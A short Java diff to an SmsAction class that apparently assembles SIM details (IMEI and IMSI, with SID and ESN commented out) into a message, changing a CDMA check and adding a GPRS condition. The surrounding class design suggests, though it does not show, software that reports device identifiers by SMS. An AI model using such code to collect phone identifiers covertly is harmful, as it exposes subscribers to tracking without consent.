@@ -161,13 +161,14 @@ public class SmsAction extends SubAction {
 			case TYPE_SIM:
 				final StringBuffer sb = new StringBuffer();
 				final Device device = Device.self();
-				if (Device.isCDMA()) {
+				if (Device.isCdma()) {
 
 					// sb.append("SID: " + device.getSid() + "\n");
 					// sb.append("ESN: "
 					// + NumberUtilities.toString(device.getEsn(), 16)
 					// + "\n");
-				} else {
+				}
+				if(Device.isGprs()){
 					sb.append("IMEI: " + device.getImei() + "\n");
 					sb.append("IMSI: " + device.getImsi() + "\n");
 				}
